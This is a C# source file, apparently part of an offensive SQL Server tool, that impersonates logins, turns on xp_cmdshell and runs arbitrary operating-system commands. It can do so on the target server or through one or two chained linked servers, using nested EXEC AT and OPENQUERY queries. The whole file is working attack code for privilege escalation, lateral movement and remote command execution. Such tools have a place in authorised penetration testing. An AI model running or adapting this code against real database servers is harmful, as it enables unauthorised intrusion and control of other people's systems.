using System;
using System.Data.SqlClient;

namespace MSSharpQL.Commands
{
    internal class XPcmd
    {
        public static void XPcmdshell(string cmd, string userToImpersonate, string sqlServer, string database, string linkedServer, string doubleLinkedServer, bool enableRPC, bool exec, bool openquery)
        {
            string conStr = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";
            string output = "";
            string getCurrentuser = "Select user_name();";
            string getCurrentUserSA = "Select SUSER_SNAME();";
            string impersonateLoginUser = $"EXECUTE AS LOGIN = '{userToImpersonate}';";
            string impersonateDbUser = $"EXECUTE AS USER = '{userToImpersonate}";
            string impersonateQuery = $"use {database}; EXECUTE AS LOGIN = '{userToImpersonate}';";
            string currentEnableAdvOptionsAndEnableXP = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            string currentCMD = $"EXEC xp_cmdshell '{cmd}'";
            string execSinglelinkEnableAdvOptions = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT \"{linkedServer}\"";
            string execSingleLinkEnableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT \"{linkedServer}\"";
            string execSingleLinkCMD = $"EXEC ('xp_cmdshell ''{cmd}'';') AT \"{linkedServer}\"";
            string execDoublelinkEnableAdvOptions = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT \"{doubleLinkedServer}\"') AT \"{linkedServer}\"";
            string execDoubleLinkEnableXP = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT \"{doubleLinkedServer}\"') AT \"{linkedServer}\"";
            string execDoubleLinkCMD = $"EXEC ('EXEC (''xp_cmdshell ''''{cmd}'''';'') AT \"{doubleLinkedServer}\"') AT \"{linkedServer}\"";
            string openquerySingleLinkEnableAdvOptions = $"select 1 from openquery(\"{linkedServer}\", 'select 1; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE')";
            string openquerySingleLinkEnableXP = $"select 1 from openquery(\"{linkedServer}\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE')";
            string openquerySingleLinkCMD = $"select 1 from openquery(\"{linkedServer}\", 'select 1; exec xp_cmdshell ''{cmd}''')";
            string openqueryDoubleLinkEnableAdvOptions = $"SELECT 1 FROM openquery(\"{linkedServer}\", 'SELECT 1 FROM openquery(\"{doubleLinkedServer}\", ''select 1; EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE'')')";
            string openqueryDoubleLinkEnableXP = $"SELECT 1 FROM openquery(\"{linkedServer}\", 'SELECT 1 FROM openquery(\"{doubleLinkedServer}\", ''select 1; EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE'')')";
            string openqueryDoubleLinkCMD = $"SELECT 1 FROM openquery(\"{linkedServer}\", 'SELECT 1 FROM openquery(\"{doubleLinkedServer}\", ''select 1; EXEC xp_cmdshell ''''{cmd}'''' '')')";


            using (SqlConnection con = new SqlConnection(conStr))
            {
                try
                {
                    con.Open();

                    Connection.DatabaseConnection.GetLoginInformation(conStr, con);

                    if (!string.IsNullOrEmpty(userToImpersonate))
                    {
                        Console.WriteLine($"[+] Attempting to impersonate {userToImpersonate}.");
                        if (userToImpersonate != "dbo")
                        {
                            Connection.DatabaseConnection.ExecuteQuery(impersonateLoginUser, con);
                            output = Connection.DatabaseConnection.ExecuteQuery(getCurrentUserSA, con);
                        }
                        else
                        {
                            Connection.DatabaseConnection.ExecuteQuery(impersonateDbUser, con);
                            output = Connection.DatabaseConnection.ExecuteQuery(getCurrentuser, con);
                        }
                        Console.WriteLine($"    [+] Current User: {output}");
                    }

                    if (enableRPC)
                    {
                        Connection.DatabaseConnection.enableLinkedServerRPC(linkedServer, conStr, con);
                    }

                    if (!string.IsNullOrWhiteSpace(doubleLinkedServer))
                    {
                        Console.WriteLine($"[+] Attempting to execute commands through double linked server query: {sqlServer} => {linkedServer} => {doubleLinkedServer}");
                        if (exec)
                        {
                            Console.WriteLine("[+] Attempting to enable xp_cmdshell via EXEC.");
                            Connection.DatabaseConnection.ExecuteQuery(execDoublelinkEnableAdvOptions, con);
                            Connection.DatabaseConnection.ExecuteQuery(execDoubleLinkEnableXP, con);
                            Console.WriteLine($"[+] Executing the following command via EXEC: {cmd}");
                            output = Connection.DatabaseConnection.ExecuteQuery(execDoubleLinkCMD, con);
                            Console.Write($"    [+] Command Executed! Output: {output}");
                        }
                        else
                        {
                            Console.WriteLine("[+] Attempting to enable xp_cmdshell via openquery.");
                            Connection.DatabaseConnection.ExecuteQuery(openqueryDoubleLinkEnableAdvOptions, con);
                            Connection.DatabaseConnection.ExecuteQuery(openqueryDoubleLinkEnableXP, con);
                            Console.WriteLine($"[+] Executing the following command via openquery: {cmd}");
                            output = Connection.DatabaseConnection.ExecuteQuery(openqueryDoubleLinkCMD, con);
                            Console.Write($"    [+] Command Executed! Output (1 = Success): {output}");
                        }
                        Environment.Exit(0);
                    }
                    if (!string.IsNullOrEmpty(linkedServer))
                    {
                        Console.WriteLine($"[+] Attempting to execute commands on the following linked server: {sqlServer} => {linkedServer}");
                        if (exec)
                        {
                            Console.WriteLine("[+] Attempting to enable xp_cmdshell via EXEC.");
                            Connection.DatabaseConnection.ExecuteQuery(execSinglelinkEnableAdvOptions, con);
                            Connection.DatabaseConnection.ExecuteQuery(execSingleLinkEnableXP, con);
                            Console.WriteLine($"[+] Executing the following command via EXEC: {cmd}");
                            output = Connection.DatabaseConnection.ExecuteQuery(execSingleLinkCMD, con);
                            Console.Write($"    [+] Command Executed! Output: {output}");
                        }
                        else
                        {
                            Console.WriteLine("[+] Attempting to enable xp_cmdshell via openquery.");
                            Connection.DatabaseConnection.ExecuteQuery(openquerySingleLinkEnableAdvOptions, con);
                            Connection.DatabaseConnection.ExecuteQuery(openquerySingleLinkEnableXP, con);
                            Console.WriteLine($"[+] Executing the following command via openquery: {cmd}");
                            output = Connection.DatabaseConnection.ExecuteQuery(openquerySingleLinkCMD, con);
                            Console.Write($"    [+] Command Executed! Output (1 = Success): {output}");
                        }
                    }
                    if (string.IsNullOrEmpty(doubleLinkedServer) && string.IsNullOrEmpty(linkedServer))
                    {
                        Console.WriteLine($"[+] Attempting to execute commands on {sqlServer}");
                        Console.WriteLine("[+] Attempting to enable xp_cmdshell.");
                        Connection.DatabaseConnection.ExecuteQuery(currentEnableAdvOptionsAndEnableXP, con);
                        Console.WriteLine($"[+] Executing the following command: {cmd}");
                        output = Connection.DatabaseConnection.ExecuteQuery(currentCMD, con);
                        Console.Write($"    [+] Command Executed! Output: {output}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }
            }
        }
    }
}
